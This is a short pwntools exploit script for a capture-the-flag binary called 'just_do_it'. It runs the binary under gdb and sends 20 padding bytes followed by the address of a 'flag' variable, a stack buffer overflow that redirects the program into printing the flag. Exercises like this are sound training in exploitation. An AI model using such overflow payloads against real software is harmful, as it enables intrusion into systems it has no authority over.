from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.binary = './just_do_it'

#p = process("./just_do_it")
#gdb.attach(p,'b *0x80486aa')  # Doesn't break on fgets()
p = gdb.debug('./just_do_it', 'b *0x80486aa')

flag = 0x0804a080

buf = ""
buf += "A" * 20
buf += p32(flag)

p.recvline()
p.sendline(buf)
p.interactive()
